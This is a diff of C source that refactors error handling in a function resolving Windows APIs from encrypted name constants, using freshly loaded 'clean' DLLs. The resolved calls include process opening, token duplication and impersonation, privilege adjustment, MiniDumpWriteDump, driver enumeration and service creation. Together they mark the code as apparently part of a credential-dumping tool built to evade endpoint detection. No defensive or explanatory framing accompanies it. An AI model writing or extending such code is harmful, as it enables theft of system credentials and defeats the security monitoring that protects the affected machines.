@@ -59,38 +59,120 @@ BOOL ResolveAllApis(void) {
     HMODULE hDbghelp = LoadCleanDLL("dbghelp.dll");
     HMODULE hPsapi = LoadCleanDLL("psapi.dll");
 
-    if ( !hKernel32 || !hNtdll || !hAdvapi32 || !hDbghelp || !hPsapi) {
+    if (!hKernel32 || !hNtdll || !hAdvapi32 || !hDbghelp || !hPsapi) {
         log_error("Failed to load required DLLs.");
         return FALSE;
     }
 
-    BOOL success =
-        ResolveApiFromDll(hKernel32, P32F_ENC, sizeof(P32F_ENC), (void**)&pP32F) &&
-        ResolveApiFromDll(hKernel32, P32N_ENC, sizeof(P32N_ENC), (void**)&pP32N) &&
-        ResolveApiFromDll(hKernel32, OP_ENC, sizeof(OP_ENC), (void**)&pOP) &&
-        ResolveApiFromDll(hKernel32, GPA_ENC, sizeof(GPA_ENC), (void**)&pGPA) &&
-        ResolveApiFromDll(hNtdll, NTCPE_ENC, sizeof(NTCPE_ENC), (void**)&pNTCPX) &&
-        ResolveApiFromDll(hKernel32, CTH_ENC, sizeof(CTH_ENC), (void**)&pCTH) &&
-        ResolveApiFromDll(hAdvapi32, OPTK_ENC, sizeof(OPTK_ENC), (void**)&pOPTK) &&
-        ResolveApiFromDll(hAdvapi32, DUPTOK_ENC, sizeof(DUPTOK_ENC), (void**)&pDUPTOK) &&
-        ResolveApiFromDll(hAdvapi32, IMP_ENC, sizeof(IMP_ENC), (void**)&pIMP) &&
-        ResolveApiFromDll(hAdvapi32, STT_ENC, sizeof(STT_ENC), (void**)&pSTT) &&
-        ResolveApiFromDll(hAdvapi32, ATP_ENC, sizeof(ATP_ENC), (void**)&pATP) &&
-        ResolveApiFromDll(hAdvapi32, LPVA_ENC, sizeof(LPVA_ENC), (void**)&pLPVA) &&
-        ResolveApiFromDll(hDbghelp, MDWD_ENC, sizeof(MDWD_ENC), (void**)&pMDWD) &&
-        ResolveApiFromDll(hKernel32, GPID_ENC, sizeof(GPID_ENC), (void**)&pGPID) &&
-        ResolveApiFromDll(hKernel32, GCP_ENC, sizeof(GCP_ENC), (void**)&pGCP) &&
-        ResolveApiFromDll(hKernel32, CFA_ENC, sizeof(CFA_ENC), (void**)&pCFA) &&
-        ResolveApiFromDll(hKernel32, DIOC_ENC, sizeof(DIOC_ENC), (void**)&pDIOC)&&
-        ResolveApiFromDll(hKernel32, LLW_ENC, sizeof(LLW_ENC), (void**)&pLLW)&&
-        ResolveApiFromDll(hPsapi, EDD_ENC, sizeof(EDD_ENC), (void**)&pEDD)&&
-        ResolveApiFromDll(hAdvapi32, OSCM_ENC, sizeof(OSCM_ENC), (void**)&pOSCM) &&
-        ResolveApiFromDll(hAdvapi32, CS_ENC, sizeof(CS_ENC), (void**)&pCS) &&
-        ResolveApiFromDll(hAdvapi32, OS_ENC, sizeof(OS_ENC), (void**)&pOS) &&
-        ResolveApiFromDll(hAdvapi32, SS_ENC, sizeof(SS_ENC), (void**)&pSS) &&
-        ResolveApiFromDll(hAdvapi32, CSVC_ENC, sizeof(CSVC_ENC), (void**)&pCSVC) &&
-        ResolveApiFromDll(hAdvapi32, DS_ENC, sizeof(DS_ENC), (void**)&pDS) &&
-        ResolveApiFromDll(hAdvapi32, CSH_ENC, sizeof(CSH_ENC), (void**)&pCSH);
+    BOOL ok = TRUE;
 
-    return success;
+    if (!ResolveApiFromDll(hKernel32, P32F_ENC, sizeof(P32F_ENC), (void**)&pP32F)) {
+        // log_error("Failed to resolve Process32First");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hKernel32, P32N_ENC, sizeof(P32N_ENC), (void**)&pP32N)) {
+        // log_error("Failed to resolve Process32Next");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hKernel32, OP_ENC, sizeof(OP_ENC), (void**)&pOP)) {
+        // log_error("Failed to resolve OpenProcess");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hKernel32, GPA_ENC, sizeof(GPA_ENC), (void**)&pGPA)) {
+        // log_error("Failed to resolve GetProcAddress");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hNtdll, NTCPE_ENC, sizeof(NTCPE_ENC), (void**)&pNTCPX)) {
+        // log_error("Failed to resolve NtCreateProcessEx");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hKernel32, CTH_ENC, sizeof(CTH_ENC), (void**)&pCTH)) {
+        // log_error("Failed to resolve CreateToolhelp32Snapshot");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, OPTK_ENC, sizeof(OPTK_ENC), (void**)&pOPTK)) {
+        // log_error("Failed to resolve OpenProcessToken");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, DUPTOK_ENC, sizeof(DUPTOK_ENC), (void**)&pDUPTOK)) {
+        // log_error("Failed to resolve DuplicateTokenEx");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, IMP_ENC, sizeof(IMP_ENC), (void**)&pIMP)) {
+        // log_error("Failed to resolve ImpersonateLoggedOnUser");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, STT_ENC, sizeof(STT_ENC), (void**)&pSTT)) {
+        // log_error("Failed to resolve SetThreadToken");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, ATP_ENC, sizeof(ATP_ENC), (void**)&pATP)) {
+        // log_error("Failed to resolve AdjustTokenPrivileges");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, LPVA_ENC, sizeof(LPVA_ENC), (void**)&pLPVA)) {
+        // log_error("Failed to resolve LookupPrivilegeValueA");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hDbghelp, MDWD_ENC, sizeof(MDWD_ENC), (void**)&pMDWD)) {
+        // log_error("Failed to resolve MiniDumpWriteDump");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hKernel32, GPID_ENC, sizeof(GPID_ENC), (void**)&pGPID)) {
+        // log_error("Failed to resolve GetProcessId");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hKernel32, GCP_ENC, sizeof(GCP_ENC), (void**)&pGCP)) {
+        // log_error("Failed to resolve GetCurrentProcess");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hKernel32, CFA_ENC, sizeof(CFA_ENC), (void**)&pCFA)) {
+        // log_error("Failed to resolve CreateFileA");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hKernel32, DIOC_ENC, sizeof(DIOC_ENC), (void**)&pDIOC)) {
+        // log_error("Failed to resolve DeviceIoControl");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hKernel32, LLW_ENC, sizeof(LLW_ENC), (void**)&pLLW)) {
+        // log_error("Failed to resolve LoadLibraryW");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hPsapi, EDD_ENC, sizeof(EDD_ENC), (void**)&pEDD)) {
+        // log_error("Failed to resolve EnumDeviceDrivers");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, OSCM_ENC, sizeof(OSCM_ENC), (void**)&pOSCM)) {
+        // log_error("Failed to resolve OpenSCManagerA");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, CS_ENC, sizeof(CS_ENC), (void**)&pCS)) {
+        // log_error("Failed to resolve CreateServiceA");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, OS_ENC, sizeof(OS_ENC), (void**)&pOS)) {
+        // log_error("Failed to resolve OpenServiceA");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, SS_ENC, sizeof(SS_ENC), (void**)&pSS)) {
+        // log_error("Failed to resolve StartServiceA");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, CSVC_ENC, sizeof(CSVC_ENC), (void**)&pCSVC)) {
+        // log_error("Failed to resolve ControlService");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, DS_ENC, sizeof(DS_ENC), (void**)&pDS)) {
+        // log_error("Failed to resolve DeleteService");
+        ok = FALSE;
+    }
+    if (!ResolveApiFromDll(hAdvapi32, CSH_ENC, sizeof(CSH_ENC), (void**)&pCSH)) {
+        // log_error("Failed to resolve CloseServiceHandle");
+        ok = FALSE;
+    }
+
+    if (!ok) {
+        log_error("Some APIs could not be resolved");
+    }
+    return ok;
 }
